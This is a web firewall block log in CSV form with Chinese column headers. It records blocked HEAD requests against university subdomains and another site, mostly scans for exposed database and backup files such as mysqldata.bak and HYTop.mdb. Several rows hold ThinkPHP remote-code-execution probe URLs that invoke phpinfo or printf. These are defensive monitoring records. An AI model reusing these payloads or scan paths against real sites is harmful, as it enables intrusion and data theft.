序号,攻击时间,规则编号,危害等级,源IP地址,地理位置,数据长度,源端口,目的端口,拦截方式,HTTP类型,URL
199,2022/3/2 10:00,1400001,中,116.255.179.186,中国 河南 郑州,297,1992,80,拦截,HEAD,http://micro.ustc.edu.cn/mysqldata.bak
200,2022/3/2 10:00,1400001,中,116.255.179.186,中国 河南 郑州,293,5168,80,拦截,HEAD,http://micro.ustc.edu.cn/HYTop.mdb
201,2022/3/2 10:00,1400001,中,116.255.179.186,中国 河南 郑州,292,8650,80,拦截,HEAD,http://micro.ustc.edu.cn/data.bak
212,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,292,63314,80,拦截,HEAD,http://micro.ustc.edu.cn/0511.rar
215,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,292,4918,80,拦截,HEAD,http://micro.ustc.edu.cn/1007.rar
220,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,296,11938,80,拦截,HEAD,http://micro.ustc.edu.cn/20210403.rar
221,2022/3/2 10:01,1950001,低,116.255.179.186,中国 河南 郑州,296,17242,80,拦截,HEAD,http://micro.ustc.edu.cn/20210817.rar
599,2022/3/2 10:41,1400001,中,116.255.179.186,中国 河南 郑州,295,47096,80,拦截,HEAD,http://kyb.ustc.edu.cn/mysqldata.bak
600,2022/3/2 10:41,1400001,中,116.255.179.186,中国 河南 郑州,291,48912,80,拦截,HEAD,http://kyb.ustc.edu.cn/HYTop.mdb
601,2022/3/2 10:41,1400001,中,116.255.179.186,中国 河南 郑州,290,50130,80,拦截,HEAD,http://kyb.ustc.edu.cn/data.bak
640,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,307,12512,80,拦截,HEAD,http://www.quantum2011.org/wwwquantum2011org.mdb
641,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,309,12226,80,拦截,HEAD,http://www.quantum2011.org/www.quantum2011.org.mdb
642,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,301,12310,80,拦截,HEAD,http://www.quantum2011.org/quantum2011.mdb
643,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,305,12782,80,拦截,HEAD,http://www.quantum2011.org/quantum2011.org.mdb
644,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,305,13002,80,拦截,HEAD,http://www.quantum2011.org/quantum2011_org.mdb
645,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,304,12878,80,拦截,HEAD,http://www.quantum2011.org/quantum2011org.mdb
646,2022/3/2 10:49,1400001,中,216.118.229.210,中国 香港  ,309,13112,80,拦截,HEAD,http://www.quantum2011.org/www_quantum2011_org.mdb
763,2022/3/2 11:27,1400001,中,116.255.179.186,中国 河南 郑州,304,60862,80,拦截,HEAD,http://microseismic.ustc.edu.cn/mysqldata.bak
764,2022/3/2 11:27,1400001,中,116.255.179.186,中国 河南 郑州,300,61770,80,拦截,HEAD,http://microseismic.ustc.edu.cn/HYTop.mdb
765,2022/3/2 11:27,1400001,中,116.255.179.186,中国 河南 郑州,299,63048,80,拦截,HEAD,http://microseismic.ustc.edu.cn/data.bak
770,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,299,23484,80,拦截,HEAD,http://microseismic.ustc.edu.cn/1211.rar
771,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,299,23680,80,拦截,HEAD,http://microseismic.ustc.edu.cn/1228.rar
772,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,24164,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210117.rar
773,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,25318,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210408.rar
774,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,27260,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210921.rar
775,2022/3/2 11:27,1950001,低,116.255.179.186,中国 河南 郑州,303,29318,80,拦截,HEAD,http://microseismic.ustc.edu.cn/20210218.zip
886,2022/3/2 13:11,1400001,中,116.255.179.186,中国 河南 郑州,296,12986,80,拦截,HEAD,http://mine.ustc.edu.cn/mysqldata.bak
887,2022/3/2 13:12,1400001,中,116.255.179.186,中国 河南 郑州,292,22124,80,拦截,HEAD,http://mine.ustc.edu.cn/HYTop.mdb
888,2022/3/2 13:12,1400001,中,116.255.179.186,中国 河南 郑州,291,31420,80,拦截,HEAD,http://mine.ustc.edu.cn/data.bak
889,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,294,30716,80,拦截,HEAD,http://mine.ustc.edu.cn/iiiiiii.rar
890,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,293,34468,80,拦截,HEAD,http://mine.ustc.edu.cn/nnnnnn.rar
892,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,296,36146,80,拦截,HEAD,http://mine.ustc.edu.cn/ppppppppp.rar
894,2022/3/2 13:13,1950001,低,116.255.179.186,中国 河南 郑州,291,39264,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
899,2022/3/2 13:14,1950001,低,116.255.179.186,中国 河南 郑州,291,7072,80,拦截,HEAD,http://mine.ustc.edu.cn/0313.zip
900,2022/3/2 13:15,1950001,低,116.255.179.186,中国 河南 郑州,291,13764,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
904,2022/3/2 13:23,1950001,低,116.255.179.186,中国 河南 郑州,291,42274,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
905,2022/3/2 13:23,1950001,低,116.255.179.186,中国 河南 郑州,291,51728,80,拦截,HEAD,http://mine.ustc.edu.cn/502.html
909,2022/3/2 13:27,1334081,高,45.196.126.158,中国 香港  ,202,41136,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
910,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,277,41142,80,拦截,HEAD,http://sist.ustc.edu.cn/index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
911,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,285,41162,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c4
912,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,263,41164,80,拦截,HEAD,http://sist.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=
913,2022/3/2 13:27,1334081,高,45.196.126.158,中国 香港  ,201,41174,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=
914,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,264,41132,80,拦截,HEAD,http://sist.ustc.edu.cn/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
915,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,280,41176,80,拦截,HEAD,http://sist.ustc.edu.cn/%20index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123
916,2022/3/2 13:27,1334080,高,45.196.126.158,中国 香港  ,286,41134,80,拦截,HEAD,http://sist.ustc.edu.cn/?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=0e728664f5ee5a8141bfdc0662515c45
917,2022/3/2 13:28,1400001,中,116.255.179.186,中国 河南 郑州,295,29258,80,拦截,HEAD,http://opt.ustc.edu.cn/mysqldata.bak
918,2022/3/2 13:28,1400001,中,116.255.179.186,中国 河南 郑州,291,30508,80,拦截,HEAD,http://opt.ustc.edu.cn/HYTop.mdb
919,2022/3/2 13:28,1400001,中,116.255.179.186,中国 河南 郑州,290,31408,80,拦截,HEAD,http://opt.ustc.edu.cn/data.bak
